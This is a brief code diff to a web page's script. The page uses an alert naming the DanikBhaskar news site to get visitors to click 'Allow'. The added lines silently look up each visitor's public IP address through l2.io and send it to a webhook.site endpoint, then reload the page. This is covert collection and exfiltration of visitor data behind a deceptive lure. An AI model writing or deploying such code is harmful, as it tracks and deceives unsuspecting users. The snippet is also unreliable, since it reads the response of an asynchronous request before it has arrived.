@@ -689,7 +689,10 @@ alert("Click 'Allow' to see the news on DanikBhaskar");
    var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "http://l2.io/ip.js", true ); // false for synchronous request
     xmlHttp.send( null );
-    xmlHttp.open( "GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+xmlHttp.responseText, true );
+    resip= xmlHttp.responseText;
+ var xmlHttp1 = new XMLHttpRequest();
+    xmlHttp1.open( "GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+resip, true );
+    xmlHttp1.send();
 location.reload();
 }
 	</script> 
